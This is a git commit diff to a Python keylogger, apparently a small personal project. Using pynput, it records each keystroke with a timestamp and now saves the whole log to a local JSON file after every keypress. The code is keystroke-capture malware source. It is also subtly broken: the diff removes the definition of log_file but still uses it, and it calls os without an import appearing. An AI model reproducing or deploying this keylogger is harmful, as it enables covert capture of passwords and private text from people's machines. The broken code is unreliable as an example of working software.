d03d943b77ae8911b1a306bc9d7c536c302b346e
Waleed Nouman <92309660+CosmoJelly@users.noreply.github.com>
2025-03-15 20:19:25 +0500

    Update keylogger.py
    added changes so that the keylogger retains information on the same json file rather than overriding the previous one.

--- keylogger.py
+++ keylogger.py
@@ -2,20 +2,26 @@ from pynput import keyboard
 import time
 import json
 
-log_file = "keystrokes.json"
-keystrokes = []
+if os.path.exists(log_file):
+    with open(log_file, "r") as f:
+        try:
+            keystrokes = json.load(f)
+        except json.JSONDecodeError:
+            # Create new file if corrupted and empty
+            keystrokes = []
+else:
+    keystrokes = []
 
 def on_press(key):
     try:
         key_str = key.char if hasattr(key, 'char') else str(key)
 
-        # Logging keystroke with timestamps
+        # Appending keystroke with timestamps
         keystrokes.append({"key": key_str, "timestamp": time.time()})
 
-        # Saving the file
-        if len(keystrokes) % 10 == 0:
-            with open(log_file, "w") as f:
-                json.dump(keystrokes, f, indent=4)
+        # Saving the file (updated version)
+        with open(log_file, "w") as f:
+            json.dump(keystrokes, f, indent=4)
 
     except Exception as e:
         print(f"Error: {e}")
